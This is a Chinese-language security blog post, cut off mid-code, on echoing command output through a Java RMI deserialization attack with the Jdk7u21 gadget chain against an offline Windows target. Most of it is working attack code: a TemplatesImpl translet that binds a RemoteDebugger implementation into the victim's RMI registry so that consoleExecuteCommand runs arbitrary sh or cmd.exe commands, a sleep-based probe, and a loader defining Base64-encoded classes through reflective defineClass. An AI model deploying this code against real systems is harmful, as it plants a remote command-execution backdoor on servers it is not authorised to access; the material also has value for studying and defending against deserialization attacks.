<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2021/12/05/java反序列之Jdk7u21-回显/"><span>java反序列之Jdk7u21回显</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/12/05/java反序列之Jdk7u21-回显/" rel="bookmark">
        <time class="entry-date published" datetime="2021-12-05T02:09:21.000Z">
          2021-12-05
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>以前在打RMI反序列化的时候都是用的CC、CB利用链实现报错回显，很好使。<br>之前在做一次项目的时候发现了目标存在RMI反序列化漏洞，系统为Windows，无DNS不出网。<br>通过延时探测出只存在Jdk7u21利用链。</p>
<h2 id="RMI回显"><a href="#RMI回显" class="headerlink" title="RMI回显"></a>RMI回显</h2><p>打目标时依然尝试使用老方法回显，Jdk7u21 + 报错回显，发现一直没回显。平时自己Jdk7u21利用链用得比较少，大概了解Jdk7u21最后的利用也是通过Templatesimpl#newTransformer方法实现代码执行，只能去看代码分析下失败的原因。</p>
<p>Jdk7u21利用链也是利用的AnnotationInvocationHandler动态代理，通过HashSet触发到代理handler的equal方法，最终到<br>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            Method var5 = var2[var4];</span><br><span class="line">            String var6 = var5.getName();</span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);</span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>可以发现在在invoke反射调用templatesimpl#newTransformer方法时，捕获了异常。当捕获InvocationTargetException异常时返回了false,捕获IllegalAccessException异常时，继续向上抛了异常。</p>
<p>在反射过程中，反射所调用的方法中出现未被捕获的异常时，就会抛出InvocationTargetException异常，所以这里通过templatesimpl执行任意代码抛出任意异常(包括IllegalAccessException)回显，只能进入return false的分支，最终无法实现异常回显。</p>
<p>搞清楚了无法通过异常回显的原因后，接着就开始寻思其他的解决方案，首先能想到的就是参考weblogic的T3/IIOP回显，绑定一个服务到registry上。</p>
<p>在T3回显中，服务类实现了ClusterMasterRemote接口再绑定到registry，不过ClusterMasterRemote是Weblogic中自带的类不适用我们的场景。<br>这时候去得去jdk里找一个继承了java.rmi.Remote的接口，为了比较简单的传递命令和返回命令结果，参数类型和返回类型都为String方便一点。<br>翻了一会，只找到了一个符合要求的接口，sun.jvm.hotspot.debugger.remote.RemoteDebugger。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RemoteDebugger</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">...........</span><br><span class="line">        <span class="function">String <span class="title">consoleExecuteCommand</span><span class="params">(String var1)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后定义一个类实现这个接口，最后暴露实现类最后绑定到registry，本地直接绑定成功。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.jvm.hotspot.debugger.MachineDescription;</span><br><span class="line"><span class="keyword">import</span> sun.jvm.hotspot.debugger.ReadResult;</span><br><span class="line"><span class="keyword">import</span> sun.jvm.hotspot.debugger.remote.RemoteDebugger;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIBindService2</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">RemoteDebugger</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RMIBindService2</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">0</span>);</span><br><span class="line">            registry.rebind(<span class="string">&quot;hhhh&quot;</span>, <span class="keyword">this</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOS</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCPU</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MachineDescription <span class="title">getMachineDescription</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">lookupInProcess</span><span class="params">(String s, String s1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ReadResult <span class="title">readBytesFromProcess</span><span class="params">(<span class="keyword">long</span> l, <span class="keyword">long</span> l1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasConsole</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConsolePrompt</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">consoleExecuteCommand</span><span class="params">(String command)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">        String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>,  command&#125;;</span><br><span class="line">        java.io.InputStream in = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        String output = s.next();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJBooleanSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJByteSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJCharSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJDoubleSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJFloatSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJIntSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJLongSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getJShortSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getHeapOopSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getNarrowOopBase</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNarrowOopShift</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getKlassPtrSize</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getNarrowKlassBase</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNarrowKlassShift</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">areThreadsEqual</span><span class="params">(<span class="keyword">long</span> l, <span class="keyword">boolean</span> b, <span class="keyword">long</span> l1, <span class="keyword">boolean</span> b1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getThreadHashCode</span><span class="params">(<span class="keyword">long</span> l, <span class="keyword">boolean</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span>[] getThreadIntegerRegisterSet(<span class="keyword">long</span> l, <span class="keyword">boolean</span> b) <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">long</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在打目标时却失败了，隐约能感觉出是因为目标环境中RemoteDebugger的问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">Class.forName(<span class="string">&quot;sun.jvm.hotspot.debugger.remote.RemoteDebugger&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        Thread.currentThread().sleep(<span class="number">10000L</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>用sleep验证了下，发现目标RemoteDebuggerg还真有问题。</p>
<p>为了解决这个问题，直接分别defineClass生成三个类，继承Remote的接口、实现类、触发绑定registry方法的类，用这方法打目标倒是成功了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIBind</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RMIBind</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ClassLoader cl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        Method method = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class &#125;);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytesImpl = Base64.decode(<span class="string">&quot;yv66vgAAADEADgcACgcACwcADAEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMHAA0BAApTb3VyY2VGaWxlAQAXdHJpZ2dlckJpbmRFeGVjT2JqLmphdmEBAAxCaW5kRXhlY0ltcGwBABBqYXZhL2xhbmcvT2JqZWN0AQAPamF2YS9ybWkvUmVtb3RlAQATamF2YS9pby9JT0V4Y2VwdGlvbgYAAAEAAgABAAMAAAABBAEABAAFAAEABgAAAAQAAQAHAAEACAAAAAIACQ==&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesService = Base64.decode(<span 